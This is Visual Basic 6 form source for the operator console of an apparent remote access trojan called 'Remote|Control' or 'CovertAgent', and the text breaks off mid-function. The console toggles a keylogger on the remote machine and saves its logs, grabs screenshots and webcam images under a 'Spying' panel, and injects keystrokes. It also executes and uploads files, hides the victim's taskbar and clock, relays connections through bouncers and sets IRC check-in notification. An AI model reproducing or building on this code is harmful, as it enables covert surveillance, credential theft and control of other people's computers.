Private Sub cmdEndChat_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdEndChat
End Sub

Private Sub cmdEndChat_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdEndChat
End Sub


Private Sub cmdHide_Click()
Select Case LCase(cmbHideShow.Text)
Case "start button"
    Send "windows;hide;startbutton;"
Case "whole taskbar"
    Send "windows;hide;taskbar;"
Case "taskbar programs"
    Send "windows;hide;taskbaritems;"
Case "system tray"
    Send "windows;hide;systray;"
Case "clock"
    Send "windows;hide;sysclock;"
End Select
End Sub

Private Sub cmdHide_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdHide
End Sub

Private Sub cmdHide_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdHide
End Sub

Private Sub cmdLoadSettings_Click()
Send "settings;getsettings;;;"
End Sub

Private Sub cmdLoadSettings_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdLoadSettings
End Sub

Private Sub cmdLoadSettings_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdLoadSettings
End Sub

Private Sub cmdMultimediaDeviceManager_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdMultimediaDeviceManager
End Sub

Private Sub cmdMultimediaDeviceManager_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdMultimediaDeviceManager
End Sub

Private Sub cmdOldLogs_Click()
Status "Retrieving old logs..."
Send "oldlogs;"
End Sub

Private Sub cmdOpen_Click()
Send "file;execute;" & cmbDrives.Tag & lstFileManager.SelectedItem.Text
End Sub

Private Sub cmdOpen_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdOpen
End Sub

Private Sub cmdOpen_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdOpen
End Sub

Private Sub cmdPasteFile_Click()
Dim NewFileName As String
If cmdCopyFile.Tag = "" Then MsgBox "You have not copied any files.", vbCritical + vbOKOnly, "Error": Exit Sub
If cmbDrives.Tag = "drives" Then MsgBox "You cannot paste in this directory", vbCritical + vbOKOnly, "Error": Exit Sub

NewFileName = InputBox("Please enter the file's new name:", "Paste File")

Send "file;copy;" & CorrectReservedChars(cmdCopyFile.Tag) & ";" & CorrectReservedChars(cmbDrives.Tag & "\" & NewFileName)
Status "Copying " & cmdCopyFile.Tag & " as " & NewFileName & "."

End Sub

Private Sub cmdPauseTransfer_Click()
Select Case cmdPauseTransfer.Caption
Case "Pause"
    Send "faction;pause;1*"
    basDeclare.FileTransfer.Pause = True
    cmdPauseTransfer.Caption = "Unpause"
    MouseClick 0, cmdPauseTransfer
Case "Unpause"
    Send "faction;pause;0*"
    basDeclare.FileTransfer.Pause = False
    cmdPauseTransfer.Caption = "Pause"
    MouseClick 1, cmdPauseTransfer
End Select
End Sub

Private Sub cmdQueueDown_Click()
On Error Resume Next

Dim PrevItem As ListItem, NewItem As ListItem
Set PrevItem = lstTransfers.SelectedItem

If PrevItem.Index + 1 > lstTransfers.ListItems.Count Then Exit Sub


Set NewItem = lstTransfers.ListItems.Add(PrevItem.Index + 2, , PrevItem.Text)

For i = 1 To 3
    NewItem.SubItems(i) = PrevItem.SubItems(i)
Next i

lstTransfers.ListItems.Remove PrevItem.Index

NewItem.Selected = True


End Sub

Private Sub cmdQueueDown_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, frmMain.cmdQueueDown
End Sub

Private Sub cmdQueueDown_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, frmMain.cmdQueueDown
End Sub

Private Sub cmdQueueUp_Click()
On Error Resume Next

Dim PrevItem As ListItem, NewItem As ListItem
Set PrevItem = lstTransfers.SelectedItem

If PrevItem.Index - 1 < 1 Then Exit Sub

Set NewItem = lstTransfers.ListItems.Add(PrevItem.Index - 1, , PrevItem.Text)

For i = 1 To 3
    NewItem.SubItems(i) = PrevItem.SubItems(i)
Next i

lstTransfers.ListItems.Remove PrevItem.Index

NewItem.Selected = True


End Sub

Private Sub cmdQueueUp_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, frmMain.cmdQueueUp
End Sub

Private Sub cmdQueueUp_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, frmMain.cmdQueueUp
End Sub

Private Sub cmdRefresh_Click()
Send "file;dir;" & cmbDrives.Tag
End Sub

Private Sub cmdRefresh_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdRefresh
End Sub

Private Sub cmdRefresh_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdRefresh
End Sub

Private Sub cmdRefreshBounce_Click()
Send "bounce;list"
Status "Retrieving bounce list."
End Sub

Private Sub cmdRefreshBounce_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdRefreshBounce
End Sub

Private Sub cmdRefreshBounce_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdRefreshBounce
End Sub

Private Sub cmdRemoveBounce_Click()
On Error Resume Next
Dim lastitem As Single
lastitem = lstBounces.ListIndex
lstBounces.RemoveItem lastitem
lstBounces.ListIndex = lastitem

lblBounceUpdate.Caption = "NOT UPLOADED"
lblBounceUpdate.ForeColor = vbRed
End Sub

Private Sub cmdRemoveBounce_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdRemoveBounce
End Sub

Private Sub cmdRemoveBounce_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdRemoveBounce
End Sub

Private Sub cmdRemoveServer_Click()
Send "server;remove"
End Sub

Private Sub cmdRemoveServer_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdRemoveServer
End Sub

Private Sub cmdRemoveServer_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdRemoveServer
End Sub

Private Sub cmdRequestSystemInfo_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdRequestSystemInfo
Status "Requesting system infromation."
Send "request;computer;systeminfo;"
End Sub

Private Sub cmdRequestSystemInfo_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdRequestSystemInfo
End Sub

Private Sub cmdReset_Click()
Dim LastHost As String, LastPort As String
LastHost = wsk.RemoteHostIP
LastPort = wsk.RemotePort
Status "Closing..."
wsk.Close
Status "Reconnecting..."
wsk.LocalPort = 0
wsk.Connect LastHost, LastPort
Status "Connection reset successfuly."
End Sub

Private Sub cmdReset_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdReset
End Sub

Private Sub cmdReset_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdReset
End Sub

Private Sub cmdSaveKeyLog_Click()
On Error GoTo ErrorHandler
cdKeyLog.ShowSave
Open cdKeyLog.FileName For Output As #1
Print txtKeyLog.Text
Close #1
Exit Sub
ErrorHandler:
Exit Sub
End Sub

Private Sub cmdSaveKeyLog_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdSaveKeyLog
End Sub

Private Sub cmdSaveKeyLog_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdSaveKeyLog
End Sub

Private Sub cmdSaveSettings_Click()
Send "settings;irc;enabled;" & BasMain.TrueFalseToNumber(chkIrcNotify.Value)
Send "settings;irc;server;" & txtIrcServer.Text
Send "settings;irc;port;" & txtIrcPort.Text
Send "settings;irc;nick;" & txtIrcNick.Text
Send "settings;irc;name;" & txtIrcName.Text
Send "settings;irc;email;" & txtIrcEmail.Text

Send "settings;ac;enabled;" & BasMain.TrueFalseToNumber(chkAutoConnect.Value)
Send "settings;ac;host;" & txtACHost.Text
Send "settings;ac;port;" & txtACPort.Text

Send "settings;listen;enabled;" & BasMain.TrueFalseToNumber(chkAccept.Value)
Send "settings;listen;port;" & txtAcceptPort.Text

Send "settings;bouncers;enabled;" & BasMain.TrueFalseToNumber(chkBouncer.Value)

Send "settings;keylogger;enabled;" & BasMain.TrueFalseToNumber(chkKeylogger.Value)

End Sub

Private Sub cmdSaveSettings_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdSaveSettings
End Sub

Private Sub cmdSaveSettings_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdSaveSettings
End Sub

Private Sub cmdSendKeys_Click()
Send "keys;" & txtSendKeys.Text
End Sub

Private Sub cmdSendKeys_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdSendKeys
End Sub

Private Sub cmdSendKeys_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdSendKeys
End Sub

Private Sub cmdSendMsg_Click()
Dim StyleNumber As String

Select Case cmbStyle.Text
Case ""
    StyleNumber = 0
Case "Abort Retry Ignore"
    StyleNumber = 2
Case "Retry Cancel"
    StyleNumber = 5
Case "Inputbox"
    StyleNumber = 6
Case "Ok"
    StyleNumber = 0
Case "Ok Cancel"
    StyleNumber = 1
Case "Yes No"
    StyleNumber = 4
Case "Yes No Cancel"
    StyleNumber = 3
End Select

Send "msgbox;" & StyleNumber & ";" & fmeMessageBoxes.Tag & ";" & CorrectReservedChars(txtTitle.Text) & ";" & CorrectReservedChars(txtMsgBox.Text)

End Sub

Private Sub cmdSendMsg_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdSendMsg
End Sub

Private Sub cmdSendMsg_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdSendMsg
End Sub

Private Sub cmdServerLoad_Click()
Send "settings;reload;;;"
End Sub

Private Sub cmdServerLoad_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdSaveSettings
End Sub

Private Sub cmdServerLoad_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdSaveSettings
End Sub

Private Sub cmdShellPage_Click()
Send "shellurl;" & txtShellPage.Text
End Sub

Private Sub cmdShow_Click()
Select Case LCase(cmbHideShow.Text)
Case "start button"
    Send "windows;show;startbutton;"
Case "whole taskbar"
    Send "windows;show;taskbar;"
Case "taskbar programs"
    Send "windows;show;taskbaritems;"
Case "system tray"
    Send "windows;show;systray;"
Case "clock"
    Send "windows;show;sysclock;"
End Select
End Sub

Private Sub cmdShow_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdShow
End Sub

Private Sub cmdShow_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdShow
End Sub

Private Sub cmdShutDown_Click()
Dim result As VbMsgBoxResult
result = MsgBox("Are you sure you want to " & cmbMethod.Text & " remote computer?", vbYesNo + vbQuestion, cmbMethod.Text & "?")
If result = vbNo Then Exit Sub

Select Case LCase(cmbMethod.Text)
Case "logoff"
    Send "windows;power;logoff;"
Case "shutdown"
    Send "windows;power;shutdown;"
Case "restart windows"
    Send "windows;power;restart;"
Case "reboot computer"
    Send "windows;power;reboot;"
End Select

End Sub

Private Sub cmdShutDown_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdShutDown
End Sub

Private Sub cmdShutDown_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdShutDown
End Sub

Private Sub cmdStartChat_Click()
Send "chat;start;"
End Sub

Private Sub cmdStartChat_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdStartChat
End Sub

Private Sub cmdStartChat_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdStartChat
End Sub

Private Sub cmdStartRemoteControl_Click()
    
    frmCapture.ClientScale = Val(txtViewScale.Text)
    
    Select Case chkControlMouse.Value
    Case 0
        frmCapture.SendMouse = False
        frmCaptureTools.chkMouse.Value = 0
    Case 1
        frmCapture.SendMouse = True
        frmCaptureTools.chkMouse.Value = 1
    End Select
    
    Select Case chkControlKeyboard.Value
    Case 0
        frmCapture.SendKeys = False
        frmCaptureTools.chkKeyboard.Value = 0
    Case 1
        frmCapture.SendKeys = True
        frmCaptureTools.chkKeyboard.Value = 1
    End Select
    
    Select Case chkAutoScale.Value
    Case 0
        frmCapture.AutoScale = False
    Case 1
        frmCapture.AutoScale = True
    End Select
    
    Send "rc;" & Chr(3) & ";" & Chr(1) & Chr(0) & Val(txtHorizontalPartitions.Text) & Chr(0) & Val(txtVerticalPartitions.Text) & Chr(0) & Val(cmbColorDepth.Text) & Chr(0) & Val(txtHostScale.Text)
End Sub

Private Sub cmdTaskManager_Click()
Send "request;windows;processes"
frmTaskManager.Show vbModal, Me
End Sub

Private Sub cmdTaskManager_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdTaskManager
End Sub

Private Sub cmdTaskManager_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdTaskManager
End Sub

Private Sub cmdTerminateServer_Click()
Send "terminate;"
End Sub

Private Sub cmdTerminateServer_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdTerminateServer
End Sub

Private Sub cmdTerminateServer_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdTerminateServer
End Sub

Private Sub cmdTestMsg_Click()
Dim ImageNumber As Single, MbImage As VbMsgBoxStyle

ImageNumber = Val(fmeMessageBoxes.Tag)
Select Case ImageNumber
Case 1
MbImage = vbCritical
Case 2
MbImage = vbQuestion
Case 3
MbImage = vbExclamation
Case 4
MbImage = vbInformation
End Select

If cmbStyle.ListIndex < 6 Then
    MsgBox txtMsgBox.Text, cmbStyle.ListIndex + MbImage, txtTitle.Text
Else
    InputBox txtMsgBox.Text, txtTitle.Text
End If

End Sub

Private Sub cmdTestMsg_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdTestMsg
End Sub

Private Sub cmdTestMsg_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdTestMsg
End Sub

Private Sub cmdUp_Click()
If Right(cmbDrives.Tag, 2) = ":\" Or cmbDrives.Tag = "" Then
Send "file;drives; "
Exit Sub
End If
Send "file;up;" & cmbDrives.Tag
End Sub

Private Sub cmdUp_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdUp
End Sub

Private Sub cmdUp_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdUp
End Sub

Private Sub cmdUpdateBounce_Click()
On Error Resume Next
Dim Selected As Single, Line As String, Output As String

Status "Uploading bounce list."

Selected = lstBounces.ListIndex

lstBounces.Tag = "0"

For i = 0 To lstBounces.ListCount - 1
    lstBounces.ListIndex = i
    Line = lstBounces.Text
    Line = Replace(Line, "From port '", "")
    Line = Replace(Line, "' To '", ":")
    Line = Mid(Line, 1, Len(Line) - 1)
    
    Output = Output & Line & vbLf
    
Next i

If Right(Output, 1) = vbLf Then Output = Mid(Output, 1, Len(Output) - 1)

lstBounces.Tag = "1"

Send "bounce;update;" & Output
lstBounces.ListIndex = Selected

End Sub

Private Sub cmdUpgrade_Click()
Send "server;upgrade;" & txtUpgradePath.Text
End Sub

Private Sub cmdUpgrade_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdUpgrade
End Sub

Private Sub cmdUpgrade_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdUpgrade
End Sub

Private Sub cmdUpload_Click()
On Error GoTo ErrorHandler
If Right(cmbDrives.Tag, 1) <> "\" Then Exit Sub
Dim Destination As String, Source As String, FileSize As Long, FileNumber As Single

cdTransfer.ShowOpen
Source = cdTransfer.FileName
Destination = cmbDrives.Tag & Dir(cdTransfer.FileName)

FileNumber = FreeFile
 
Open Source For Binary Access Read As FileNumber
FileSize = LOF(FileNumber)
Close FileNumber

BasMain.AddToTransferQueue "Upload", Source, Destination, FileSize

If basDeclare.FileTransfer.FileTransfer = False Then BasMain.NextInQueue

ErrorHandler:
End Sub

Private Sub cmdUpload_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdUpload
End Sub

Private Sub cmdUpload_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdUpload
End Sub


Private Sub dloadScreen_ReceiveProgress(ByVal Progress As Long, ByVal ProgressMax As Long)
prgScreen.Max = ProgressMax
prgScreen.Value = Progress
End Sub

Private Sub dloadWebcam_ReceiveProgress(ByVal Progress As Long, ByVal ProgressMax As Long)
prgWebcam.Max = ProgressMax
prgWebcam.Value = Progress
End Sub

Private Sub cmdWindowManager_Click()
frmWindowManager.Show , Me
End Sub

Private Sub cmdWindowManager_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdWindowManager
End Sub

Private Sub cmdWindowManager_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdWindowManager
End Sub

Private Sub ExitButton_Click()

End
End Sub




Private Sub Form_Load()
On Error Resume Next

wsk.Close

wskSwitch.LocalPort = 2201
wskSwitch.Listen

cmbMethod.ListIndex = 0
cmbHideShow.ListIndex = 0

fmeAbout.Visible = True

End Sub

Private Sub Form_Resize()
TitleBar.Width = Me.Width
ExitButton.Left = Me.Width - ExitButton.Width * 2
MinimizeButton.Left = Me.Width - ExitButton.Width * 4 - MinimizeButton.Width
End Sub

Private Sub Form_Unload(Cancel As Integer)
wsk.Close
End Sub

Private Sub Image2_Click()
frmSpyView.Show
frmSpyView.SpyPictureLoad App.Path & "\Graphics\nohardware.bmp"
End Sub

Private Sub imgScreenShot_Click()
frmSpyView.Show
frmSpyView.SpyImage.Picture = imgScreenShot.Picture
frmSpyView.Tag = "s"
End Sub

Private Sub imgWebcam_Click()
frmSpyView.Show
frmSpyView.Tag = "w"
End Sub




Private Sub lblRemoveBounce_Click()

End Sub






Private Sub lstBounces_Click()

If lstBounces.Tag = "0" Then Exit Sub

On Error Resume Next
Dim ItemString As String, Temp As Single
Dim ListenOn As String, ConnectHost As String, ConnectPort As String

ItemString = lstBounces.Text

Temp = Temp1 + Len("From port '")
ItemString = Mid(ItemString, Temp)
Temp = InStr(1, ItemString, "' ")
ListenOn = Mid(ItemString, 2, Temp - 2)

Temp = InStr(1, ItemString, "To '") + Len("To '")
ItemString = Mid(ItemString, Temp)
Temp = InStr(1, ItemString, ":")
ConnectHost = Mid(ItemString, 1, Temp - 1)
ItemString = Mid(ItemString, Temp)
Temp = InStr(1, ItemString, "'")
ConnectPort = Mid(ItemString, 2, Temp - 2)

txtListenOn.Text = ListenOn
txtBounceHost.Text = ConnectHost
txtBouncePort.Text = ConnectPort
End Sub

Private Sub lstFileManager_AfterLabelEdit(Cancel As Integer, NewString As String)
Send "file;rename;" & BasMain.CorrectReservedChars(OriginalFileName) & ";" & BasMain.CorrectReservedChars(cmbDrives.Tag & NewString)
End Sub

Private Sub lstFileManager_BeforeLabelEdit(Cancel As Integer)
OriginalFileName = cmbDrives.Tag & lstFileManager.SelectedItem.Text
End Sub

Private Sub lstFileManager_DblClick()
On Error Resume Next

If Right(lstFileManager.SelectedItem.Text, 2) = ":\" Then
    Send "file;dir;" & lstFileManager.SelectedItem.Text
    Exit Sub
End If

Select Case lstFileManager.SelectedItem.Icon
Case 4
    'Clicked on a directory
    Send "file;dir;" & cmbDrives.Tag & lstFileManager.SelectedItem.Text
Case Else
    'Clicked on a file
Send "file;execute;" & cmbDrives.Tag & CorrectReservedChars(lstFileManager.SelectedItem.Text) & ";"
End Select
End Sub

Private Sub lstFileManager_ItemClick(ByVal Item As MSComctlLib.ListItem)
ItemText = Item.Text
If Left(ItemText, 1) = "\" Then ItemText = Mid(ItemText, 2) & "\"
txtPath.Text = cmbDrives.Tag & ItemText
End Sub

Private Sub lstMain_Click()
If lstMain.Text = "" Then Me.Caption = "CovertAgent": Exit Sub Else: Me.Caption = lstMain.Text & " - Syndrome"
fmeConnection.Visible = False
fmeSystemInfo.Visible = False
fmeSpying.Visible = False
fmeFileManager.Visible = False
fmeKeyboard.Visible = False
fmeTransfers.Visible = False
fmeWindows.Visible = False
fmeChat.Visible = False
fmeAbout.Visible = False
fmeMsgBox.Visible = False
fmeBouncing.Visible = False
tmrCredits.Enabled = False
fmeRemoteControl.Visible = False

Select Case LCase(lstMain.Text)
Case "connection info"
    fmeConnection.Visible = True
    txtLog.SelStart = Len(txtLog.Text)
Case "remote computer info"
    fmeSystemInfo.Visible = True
Case "spying"
    fmeSpying.Visible = True
Case "file manager"
    fmeFileManager.Visible = True
    If lstFileManager.ListItems.Count = 0 Then
        Send "file;drives;*"
    End If
Case "file transfers"
    fmeTransfers.Visible = True
Case "keyboard"
    fmeKeyboard.Visible = True
    Me.txtKeyLog.SelStart = Len(txtKeyLog.Text)
Case "remoteaxe-s"
    fmeRemoteControl.Visible = True
Case "windows"
    fmeWindows.Visible = True
Case "about remotecontrol"
    fmeAbout.Visible = True
    tmrCredits.Enabled = True
Case "chat"
    fmeChat.Visible = True
Case "message boxes"
    fmeMsgBox.Visible = True
Case "connection bouncing"
    fmeBouncing.Visible = True
Case Else
    fmeAbout.Visible = True
    tmrCredits.Enabled = True
End Select

End Sub

Private Sub lstMain_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
If Button = 2 Then frmDebug.Show
End Sub

Private Sub MinimizeButton_Click()
Me.WindowState = 1
End Sub

Private Sub optMsgCritical_Click()
fmeMessageBoxes.Tag = "1"
End Sub

Private Sub optMsgExclamation_Click()
fmeMessageBoxes.Tag = "3"
End Sub

Private Sub optMsgInformation_Click()
fmeMessageBoxes.Tag = "4"
End Sub

Private Sub optMsgQuestion_Click()
fmeMessageBoxes.Tag = "2"
End Sub

Private Sub picCredits_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
CredRandX = x - Int(lblCredits.Width / 2)
CredRandY = y - Int(lblCredits.Height / 2)
End Sub

Private Sub shpSend_Click()
If NickName = "" Then fmeChatOptions.Visible = True: MsgBox "You have not set a nickname!", vbExclamation + vbOKOnly, "Remote|Control Chat": VBA.Beep: Exit Sub
ReceiveMessage NickName, txtMessage.Text
Send "chat;message;" & BasMain.CorrectReservedChars(NickName) & ";" & BasMain.CorrectReservedChars(txtMessage.Text)
txtMessage.Text = ""
txtMessage.SetFocus
End Sub

Private Sub shpSend_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
lblSend.ForeColor = &H8000000D
MouseClick 0, frmMain.cmdSend
End Sub

Private Sub shpSend_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, frmMain.cmdSend
lblSend.ForeColor = &H80000009
End Sub

Private Sub TitleBar_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
FormDrag Me
End Sub

Public Function MouseClick(State As Single, Button As Control)
On Error Resume Next
Select Case State
Case 0
Button.BackColor = &H80000009
Button.ForeColor = &H8000000D
Case 1
Button.BackColor = &H8000000D
Button.ForeColor = &H80000009
End Select
End Function

Private Sub tmrAuthour_Timer()
'tmrAuthour.Enabled = False
'Makes the label with my name in it scroll left and right
Select Case lblMessage.Left
Case Is >= Me.Width - lblMessage.Width
AuthorDirection = 1
Case Is <= 0
AuthorDirection = 0
End Select
'0 = Left
'1 = Right
If AuthorDirection = 0 Then lblMessage.Left = lblMessage.Left + 30
If AuthorDirection = 1 Then lblMessage.Left = lblMessage.Left - 30
End Sub

Private Sub tmrConnectionTime_Timer()
Dim Seconds As String, Minutes As String
ConnectedSeconds = ConnectedSeconds + 1

If ConnectedSeconds = 60 Then
ConnectedSeconds = 0
ConnectedMinutes = ConnectedMinutes + 1
End If

Seconds = CStr(ConnectedSeconds)
If Len(Seconds) = 1 Then Seconds = "0" & Seconds

Minutes = CStr(ConnectedMinutes)
If Len(Minutes) = 1 Then Minutes = "0" & Minutes

txtConnectionTime.Text = Minutes & ":" & Seconds
End Sub

Private Sub tmrCredits_Timer()
Dim Left As Single, Top As Single
Dim DistanceX As Single, DistanceY As Single

Left = lblCredits.Left
Top = lblCredits.Top

DistanceX = Left - CredRandX 'Get the horizontal distance
DistanceY = Top - CredRandY  'Get the verticle distance

Left = Left - Round(DistanceX / 15)  'Move the image 10% closer to the horizontal axis
Top = Top - Round(DistanceY / 15) 'Move the image 10% closer to the vertical axis

If Int(DistanceX) < 10 And Int(DistanceX) > -10 And Int(DistanceY) < 10 And Int(DistanceY) > -10 Then
    GoTo NewNumber
End If

lblCredits.Left = Left
lblCredits.Top = Top

Exit Sub
NewNumber:
Randomize
CredRandX = Int(Rnd(1) * picCredits.Width - lblCredits.Width)
Randomize
CredRandY = Int(Rnd(1) * (picCredits.Height - lblCredits.Height))
End Sub

Private Sub tmrDblClick_Timer()
Debug.Print "DC=FALSE (TIMER)"
DoubleClicked = False
tmrDblClick.Enabled = False
End Sub

Private Sub tmrSpeed_Timer()
'tmrSpeed.Enabled = False
With basDeclare.FileTransfer
    If .FileTransfer = False Then txtTransferSpeed.Caption = "": Exit Sub
    
    If .BytesThisSecond < 1024 Then
        txtTransferSpeed.Caption = .BytesThisSecond & "bps"
    Else
        txtTransferSpeed.Caption = Round((.BytesThisSecond / 1024), 2) & "kbps"
    End If
            
    .BytesThisSecond = 0
End With
End Sub

Private Sub tmrWait_Timer()
'tmrWait.Enabled = False
'Returns to my name and starts scrolling again 5 seconds after a status message
lblMessage.Caption = "Remote|Control (Tim Cinel 2002)"
lblMessage.Width = 2775
lblMessage.Left = 0
tmrAuthour.Enabled = True
tmrWait.Enabled = False
End Sub

Private Sub txtSendSpKeys_KeyPress(KeyAscii As Integer)
AsciiCode = KeyAscii
wskKeyboard.SendData "key:" & KeyAscii
txtSendSpKeys.Text = "Character (" & AsciiCode & ") was sent."
End Sub

Private Sub txtSendSpKeys_KeyUp(KeyCode As Integer, Shift As Integer)
txtSendSpKeys.Text = "Character (" & AsciiCode & ") was sent."
End Sub
 

Private Sub txtHorizontalPartitions_LostFocus()
    If Val(txtHorizontalPartitions.Text) < 1 Then
        txtHorizontalPartitions.Text = "1"
    ElseIf Val(txtHorizontalPartitions.Text) > 16 Then
        txtHorizontalPartitions.Text = "16"
    End If
End Sub

Private Sub txtHost_Change()
RemoteHostText = txtHost.Text
End Sub




Private Sub txtHostScale_LostFocus()
    If Val(txtHostScale.Text) < 10 Then
        txtHostScale.Text = "10"
    ElseIf Val(txtHostScale.Text) > 100 Then
        txtHostScale.Text = "100"
    End If
End Sub

Private Sub txtMessage_KeyPress(KeyAscii As Integer)
If KeyAscii = 10 Then txtMessage.Text = txtMessage.Text: txtMessage.SelStart = Len(txtMessage.Text)
If KeyAscii = 13 Then shpSend_Click
End Sub

Private Sub txtNick_Change()
WriteINI "Chat", "nick", txtNick.Text, "remotecontrol.ini"
NickName = txtNick.Text
End Sub

Private Sub txtPort_Change()
RemotePortText = txtPort.Text
End Sub



Private Sub txtPreviewScale_LostFocus()
    If Val(txtPreviewScale.Text) > 100 Then
        txtPreviewScale.Text = "100"
    ElseIf Val(txtPreviewScale.Text) < 10 Then
        txtPreviewScale.Text = "10"
    End If
    
    txtPreviewScale.Text = Val(txtPreviewScale.Text)
End Sub

Private Sub txtTypeLive_KeyDown(KeyCode As Integer, Shift As Integer)
Send "key;down;" & KeyCode
End Sub


Private Sub txtTypeLive_KeyUp(KeyCode As Integer, Shift As Integer)
Send "key;up;" & KeyCode
End Sub


Private Sub txtVerticalPartitions_LostFocus()
    If Val(txtVerticalPartitions.Text) < 1 Then
        txtVerticalPartitions.Text = "1"
    ElseIf Val(txtVerticalPartitions.Text) > 16 Then
        txtVerticalPartitions.Text = "16"
    End If
End Sub

Private Sub wsk_Close()
Status "Connection closed."
tmrConnectionTime.Enabled = False
Received = 0
Sent = 0
SendData 0
ReceiveData 0
txtConnectionTime.Text = "00:00"
txtConnectionStatus.Text = "Not Connected"

lstFileManager.ListItems.Clear
cmbDrives.Clear
cmbDrives.Tag = ""

Reset
basProccess.FileAction "terminate"

wsk.Close

End Sub

Private Sub wsk_Connect()
Status "Connected to " & wsk.RemoteHostIP & ":" & wsk.RemotePort
txtHost.Text = wsk.RemoteHostIP
WriteINI "RememberedSettings", "Host", RemoteHostText, "remotecontrol.ini"
WriteINI "RememberedSettings", "Port", RemotePortText, "remotecontrol.ini"
tmrConnectionTime.Enabled = True
txtConnectionTime.Text = "00:00"
ConnectedMinutes = 0
ConnectedSeconds = 0
txtConnectionStatus.Text = "Connected"
Send "request;computer;systeminfo;"
Send "settings;getsettings;;;"

txtKeyLog.Text = ""

End Sub


Private Sub wsk_ConnectionRequest(ByVal requestID As Long)

If chkAcceptIncomming.Value = 0 Then Exit Sub

If MsgBox("Do you want to accept an incomming connection from " & wsk.RemoteHostIP & "?", vbYesNo + vbQuestion, "Accept Connection?") = vbYes Then
    wsk.Close
    wsk.LocalPort = 0
    wsk.Accept requestID
    wsk_Connect
Else
    wsk.Close
    wsk.LocalPort = 0
    wsk.Accept requestID
    wsk.Close
    wsk.LocalPort = 2201
    wsk.Listen
    Status wsk.RemoteHostIP & "'s connection was rejected."
End If

End Sub

Private Sub wsk_DataArrival(ByVal bytesTotal As Long)
On Error GoTo ErrorHandler
ReceiveData CSng(bytesTotal)
Dim Data As String, commands() As String, Temp() As String, Command As String, Arguments As String
wsk.PeekData Data
If Right(Data, 1) <> "¤" Then Exit Sub

